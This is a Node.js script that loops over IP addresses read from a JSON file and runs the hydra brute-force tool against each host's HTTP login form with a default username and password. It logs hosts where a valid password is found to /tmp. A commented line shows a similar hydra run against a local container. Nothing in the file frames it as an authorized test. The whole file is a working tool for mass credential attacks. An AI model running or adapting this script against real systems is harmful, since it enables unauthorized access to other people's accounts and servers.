// exec(`hydra -l shimmy -p 12345 -s 3000 172.17.0.3 http-get-form '/login:username=^USER^&password=^PASS^:Wrong parameters!'`, (error, stdout, stderr) => {

import fs from 'fs';
import { exec } from 'child_process';

const run = (ip) => {
  return new Promise((resolve, reject) => {
    exec(
      `hydra -vvv -w 10 -l user -p pass ${ip} http-post-form '/login:username=^USER^&password=^PASS^:Invalid credentials.'`,
      (error, stdout, stderr) => {
        console.log({ error, stdout, stderr });
        resolve(stdout);
        reject(error);
      }
    );
  });
};

(async () => {
  const reg = new RegExp('([0-9]) valid password found');
  const fileName = 'data.json';
  const data = await fs.promises.readFile(fileName, {
    encoding: 'utf8',
    flag: 'r',
  });
  const dataJson = JSON.parse(data);

  let from = process.argv[2] || 0;
  let to = process.argv[3] || dataJson.length;

  for (let i = from; i < to; i++) {
    const ip = dataJson[i].ip;

    try {
      const results = await run(ip);
      const resultsStr = results.toString();
      const match = resultsStr.match(reg);

      if (match[1] >= 0) {
        await fs.appendFile(
          `/tmp/result-${ip}_${match[1]}`,
          resultsStr,
          (err) => {}
        );
      } else {
        await fs.appendFile(`/tmp/result-${ip}_zzz`, resultsStr, (err) => {});
      }
    } catch (error) {
      await fs.appendFile(`/tmp/error-${ip}`, error.toString(), (err) => {});
    }
  }
})();
